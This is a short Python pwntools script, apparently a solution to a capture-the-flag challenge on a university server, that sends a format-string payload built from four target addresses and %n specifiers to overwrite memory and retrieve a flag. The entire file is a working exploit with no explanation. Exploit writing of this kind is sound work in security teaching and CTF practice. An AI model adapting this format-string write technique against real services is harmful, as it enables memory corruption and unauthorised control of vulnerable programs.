from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22195"

r = remote(SERVER,PORT)

msg = (
        b"\x44\xa0\x04\x08" + 
        b"\x45\xa0\x04\x08" +
        b"\x46\xa0\x04\x08" +
        b"\x47\xa0\x04\x08" +
        b"%153x%7$n"+
        b"%113x%8$n"+
        b"%69x%9$n"+
        b"%176x%10$n"
       )

r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()